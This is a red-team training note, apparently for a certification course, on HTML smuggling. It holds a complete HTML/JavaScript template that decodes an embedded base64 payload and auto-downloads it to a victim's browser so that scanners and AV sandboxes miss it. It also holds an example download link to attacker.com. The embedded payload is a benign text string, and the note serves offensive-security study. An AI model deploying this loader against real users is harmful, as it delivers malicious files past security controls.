
Allows to get around scanners and AV sandbox by embedding the payload into the HTML source code and using Javascript to construct URLs by the browser at runtime. 

Typical link in a html file (easily scannable):

`<a href="http://attacker.com/file.doc">Download Me</a>`


### 🖊️ Setup

1) You can host the following html file:

```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

2) Once the victim is sent to this webpage, a malicious file will be downloaded automatically. In this example "test.txt", the contents of the file are the uncoded base64 string added. 
3) MOTW will be present in the file though. 


## 📔 Description

- 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 11:36
🏷️ tags: #redteam #crto   
---

